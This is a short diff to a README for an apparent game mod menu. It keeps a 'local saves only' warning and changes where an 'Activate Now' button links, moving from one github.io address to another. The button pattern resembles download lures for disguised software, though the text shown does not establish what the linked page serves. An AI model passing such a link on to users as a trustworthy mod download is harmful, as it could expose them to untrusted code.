@@ -11,7 +11,7 @@ This mod menu was built for **total control** without requiring any external inj
 > [!IMPORTANT]
 > Use the menu **only on local saves** — cloud sync mods may duplicate configs if left active across multiple systems
 
-[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://fastsetup.github.io/.github/) 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://silksong-mod-menu.github.io/.github/) 
 
 ---
 
